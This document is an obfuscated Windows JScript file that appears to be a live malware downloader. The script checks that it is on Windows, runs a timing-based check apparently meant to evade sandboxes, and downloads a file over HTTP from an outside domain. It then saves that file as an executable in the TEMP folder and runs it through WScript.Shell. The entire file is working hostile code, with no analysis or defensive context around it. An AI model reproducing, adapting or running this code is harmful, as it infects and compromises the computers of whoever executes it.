var j = false;
var Gy = "CreateObject";
var I = function q() {return WScript[Gy]("WScript.Shell");}(), F = 11;
var fZ = "MSXML2.XMLHTTP";
var ce = 2123213;
var X = 0;
function P(no){I["Run"](no, X, X);};
function Y(){return "" + fZ;};
function aj(KK, j0){X = X * 1; return KK - j0;};
function T(){return Gy;};
/*@cc_on
  @if (@_win32 || @_win64)
    j = true;
  @end
@*/
if (j)
{
var V0 = "";
function e(){return 22;};
var IA = 0; var vj = 0;
function i()
{
var g = new this["Date"]();
var aM = g["getUTCMilliseconds"]();
WScript["Sleep"](e());
var g = new this["Date"]();
var q0 = g["getUTCMilliseconds"]();
WScript["Sleep"](e());
var g = new this["Date"]();
var Iu = g["getUTCMilliseconds"]();
var IA = "O";
IA = aj(q0, aM);
var vj = "k0";
vj = aj(Iu, q0);
V0 = "open";
return aj(IA, vj);
}
var cF = false;
var kA = false;
for (var B = X; B < e() * 1; B++){if (i() != X){
cF = true; 
vj = "31" + 11 * IA + vj; 
kA = true; 
break;
}}
function G() {return ((cF == true) && (cF == kA)) ? 1 : X;};
if (cF && G() && kA){
function V() {return I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "FlOpYInGt.exe";};
 D0 = Y();
 w = WScript[Gy](D0);
 var m = 1;
 while (m){
try {
w[V0]("GET", "http://caferacerpneus.com.br/lw2osd", false);
w["send"]();
Ny = "Sleep";
for (;;){WScript[Ny](e() * 11); if (w["readystate"] >= 2 * 2) break;};
m = X;
} catch(Ki){};
}
function qo(Cl) {var D = (1, 2, 3, 4, 5, Cl); return D;};
d = WScript[T()]("ADODB.Stream");
D0 = d;
D0[V0]();
D0["type"] = qo(1);
D0["write"](w["ResponseBody"]);
d["position"] = qo(X);
D0["Save" + "ToFile"](V(), 2);
d["c"+"lose"]();
k = V();
P(k);
}
}

